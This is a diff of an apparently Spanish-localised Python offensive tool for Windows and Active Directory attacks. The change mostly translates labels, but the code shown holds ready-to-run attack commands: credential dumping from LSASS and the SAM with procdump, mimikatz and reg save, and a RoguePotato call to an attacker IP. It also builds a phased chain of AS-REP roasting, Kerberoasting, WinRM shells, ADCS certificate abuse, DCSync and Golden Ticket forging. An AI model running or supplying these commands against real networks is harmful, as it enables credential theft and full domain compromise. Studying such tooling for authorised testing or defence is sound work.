@@ -333,39 +333,39 @@ PRIV_ATTACKS = {
         ("RoguePotato",   "RoguePotato.exe -r <attacker_ip> -e 'cmd.exe'"),
     ],
     "SeBackupPrivilege": [
-        ("SAM/SYSTEM dump", "reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM sys.bak"),
+        ("Volcado SAM/SISTEMA", "reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM sys.bak"),
         ("Diskshadow",      "diskshadow /s script.txt  → copia VSS de NTDS.dit"),
     ],
     "SeRestorePrivilege": [
-        ("DLL hijack",  "Reemplazar DLL de servicio privilegiado con payload"),
+        ("Secuestro de DLL",  "Reemplazar DLL de servicio privilegiado con payload"),
     ],
     "SeLoadDriverPrivilege": [
-        ("Capcom exploit", "eoploaddriver.exe + exploit kernel"),
+        ("Exploit Capcom", "eoploaddriver.exe + exploit kernel"),
     ],
     "SeDebugPrivilege": [
-        ("LSASS dump",  "procdump.exe -ma lsass.exe lsass.dmp"),
+        ("Volcado LSASS",  "procdump.exe -ma lsass.exe lsass.dmp"),
         ("mimikatz",    "mimikatz.exe \"sekurlsa::logonpasswords\" exit"),
     ],
     "SeTakeOwnershipPrivilege": [
         ("Tomar propiedad", "takeown /f C:\\ruta\\objetivo /a && icacls ... /grant Everyone:F"),
     ],
     "SeManageVolumePrivilege": [
-        ("Arbitrary file write", "Escritura directa en volumen → reemplazar binario privilegiado"),
+        ("Escritura arbitraria de archivo", "Escritura directa en volumen → reemplazar binario privilegiado"),
     ],
 }
 
 GROUP_ATTACKS = {
-    "domain admins":           ("CRÍTICO", "¡Domain Admin!",             "impacket-secretsdump (DCSync)"),
-    "enterprise admins":       ("CRÍTICO", "Enterprise Admin",           "Control total del bosque AD"),
-    "backup operators":        ("ALTO",    "Backup Operators",           "SeBackupPrivilege → dump SAM/NTDS.dit"),
-    "server operators":        ("ALTO",    "Server Operators",           "Modificar servicios del sistema → SYSTEM"),
-    "print operators":         ("ALTO",    "Print Operators",            "SeLoadDriverPrivilege → kernel driver"),
-    "dnsadmins":               ("ALTO",    "DnsAdmins",                  "DNS plugin DLL → SYSTEM en DC"),
-    "account operators":       ("MEDIO",   "Account Operators",          "Crear/modificar usuarios en AD"),
-    "remote management users": ("MEDIO",   "Remote Management Users",    "WinRM access confirmado"),
-    "schema admins":           ("ALTO",    "Schema Admins",              "Modificar schema AD"),
-    "administrators":          ("CRÍTICO", "Administradores locales",    "mimikatz / SAM dump"),
-    "builtin\\administrators": ("CRÍTICO", "Admin local",                "mimikatz / SAM dump"),
+    "domain admins":           ("CRÍTICO", "¡Domain Admin!",                   "impacket-secretsdump (DCSync)"),
+    "enterprise admins":       ("CRÍTICO", "Administrador de Empresa",          "Control total del bosque AD"),
+    "backup operators":        ("ALTO",    "Operadores de copia de seguridad",  "SeBackupPrivilege → volcado SAM/NTDS.dit"),
+    "server operators":        ("ALTO",    "Operadores de servidor",            "Modificar servicios del sistema → SYSTEM"),
+    "print operators":         ("ALTO",    "Operadores de impresión",           "SeLoadDriverPrivilege → driver de kernel"),
+    "dnsadmins":               ("ALTO",    "Administradores DNS",               "Plugin DLL en DNS → SYSTEM en DC"),
+    "account operators":       ("MEDIO",   "Operadores de cuentas",             "Crear/modificar usuarios en AD"),
+    "remote management users": ("MEDIO",   "Usuarios de administración remota", "Acceso WinRM confirmado"),
+    "schema admins":           ("ALTO",    "Administradores de esquema",        "Modificar esquema AD"),
+    "administrators":          ("CRÍTICO", "Administradores locales",           "mimikatz / volcado SAM"),
+    "builtin\\administrators": ("CRÍTICO", "Admin local",                       "mimikatz / volcado SAM"),
 }
 
 
@@ -875,15 +875,15 @@ class JudasChain:
 
 # ─── MODO PLAN (OCD Mindmap sin ejecución) ──────────────────────────────────
 class Phase(Enum):
-    RECON    = 1
-    ENUM     = 2
-    EXPLOIT  = 3
-    ESCALATE = 4
-    PERSIST  = 5
+    RECONOCIMIENTO = 1
+    ENUMERACION    = 2
+    EXPLOTACION    = 3
+    ESCALADA       = 4
+    PERSISTENCIA   = 5
 
 PHASE_COLORS = {
-    Phase.RECON: BLUE, Phase.ENUM: CYAN, Phase.EXPLOIT: YELLOW,
-    Phase.ESCALATE: RED, Phase.PERSIST: MAGENTA,
+    Phase.RECONOCIMIENTO: BLUE, Phase.ENUMERACION: CYAN, Phase.EXPLOTACION: YELLOW,
+    Phase.ESCALADA: RED, Phase.PERSISTENCIA: MAGENTA,
 }
 
 def run_plan_mode(ctx: JudasContext) -> None:
@@ -893,52 +893,53 @@ def run_plan_mode(ctx: JudasContext) -> None:
     p = creds[1] if creds and creds[1] else "<pass>"
 
     plan = []
-    plan.append((Phase.RECON, "LOW", "Reconocimiento SMB/LDAP", [
+    plan.append((Phase.RECONOCIMIENTO, "LOW", "Reconocimiento SMB/LDAP", [
         f"nmap -p 445,389,5985,88,3389 --open -T3 {ctx.target_ip}",
         f"netexec smb {ctx.target_ip}/24 --gen-relay-list relay.txt",
         f"netexec smb {ctx.dc_ip} -u '' -p '' --rid-brute",
     ]))
-    plan.append((Phase.ENUM, "LOW", "AS-REP Roasting", [
+    plan.append((Phase.ENUMERACION, "LOW", "AS-REP Roasting", [
         f"impacket-GetNPUsers {ctx.domain}/ -dc-ip {ctx.dc_ip} -no-pass -usersfile users.txt -format hashcat",
         f"hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force",
     ]))
     if creds:
-        plan.append((Phase.ENUM, "MEDIUM", "BloodHound + enumeración LDAP", [
+        plan.append((Phase.ENUMERACION, "MEDIUM", "BloodHound + enumeración LDAP", [
             f"bloodhound-python -u {u} -p '{p}' -d {ctx.domain} -dc {ctx.dc_ip} -c All --zip",
             f"netexec smb {ctx.target_ip} -u '{u}' -p '{p}' --shares --users",
         ]))
-        plan.append((Phase.EXPLOIT, "LOW", "Kerberoasting", [
+        plan.append((Phase.EXPLOTACION, "LOW", "Kerberoasting", [
             f"impacket-GetUserSPNs {ctx.domain}/{u}:'{p}' -dc-ip {ctx.dc_ip} -request",
             f"hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force",
         ]))
-        plan.append((Phase.EXPLOIT, "MEDIUM", "Shell vía WinRM", [
+        plan.append((Phase.EXPLOTACION, "MEDIUM", "Shell vía WinRM", [
             f"evil-winrm -i {ctx.target_ip} -u {u} -p '{p}'",
         ]))
-        plan.append((Phase.ESCALATE, "LOW", "ADCS (ESC1-8)", [
+        plan.append((Phase.ESCALADA, "LOW", "ADCS (ESC1-8)", [
             f"certipy find -u {u}@{ctx.domain} -p '{p}' -dc-ip {ctx.dc_ip} -vulnerable -stdout",
             f"certipy req -u {u}@{ctx.domain} -p '{p}' -ca '<CA>' -template '<TPL>' -upn administrator@{ctx.domain}",
         ]))
-        plan.append((Phase.ESCALATE, "MEDIUM", "LAPS / ACL abuse", [
+        plan.append((Phase.ESCALADA, "MEDIUM", "LAPS / abuso de ACL", [
             f"netexec ldap {ctx.dc_ip} -u '{u}' -p '{p}' -M laps",
             f"bloodhound → buscar GenericAll / WriteDACL / ForceChangePassword",
         ]))
     if ctx.admin_smb:
-        plan.append((Phase.ESCALATE, "HIGH", "DCSync", [
+        plan.append((Phase.ESCALADA, "HIGH", "DCSync", [
             f"impacket-secretsdump {ctx.domain}/{u}:'{p}'@{ctx.dc_ip} -just-dc-ntlm",
         ]))
-    plan.append((Phase.PERSIST, "HIGH", "Golden Ticket", [
+    plan.append((Phase.PERSISTENCIA, "HIGH", "Golden Ticket", [
         f"impacket-lookupsid {ctx.domain}/{u}:'{p}'@{ctx.dc_ip} | grep 'Domain SID'",
         f"impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain {ctx.domain} Administrator",
     ]))
 
     oc = {"LOW": GREEN, "MEDIUM": YELLOW, "HIGH": RED}
+    oc_label = {"LOW": "BAJO", "MEDIUM": "MEDIO", "HIGH": "ALTO"}
     cur_phase = None
     for i, (phase, risk, name, cmds) in enumerate(plan, 1):
         if phase != cur_phase:
             cur_phase = phase
             c = PHASE_COLORS[phase]
             print(f"\n{BOLD}{c}── FASE {phase.value}: {phase.name} ──{R}")
-        print(f"\n{BOLD}[{i:02d}] {name}{R}  OPSEC: {oc[risk]}{risk}{R}")
+        print(f"\n{BOLD}[{i:02d}] {name}{R}  OPSEC: {oc[risk]}{oc_label[risk]}{R}")
         for cmd in cmds:
             if cmd.startswith("#") or "→" in cmd:
                 print(f"  {GRAY}  {cmd}{R}")
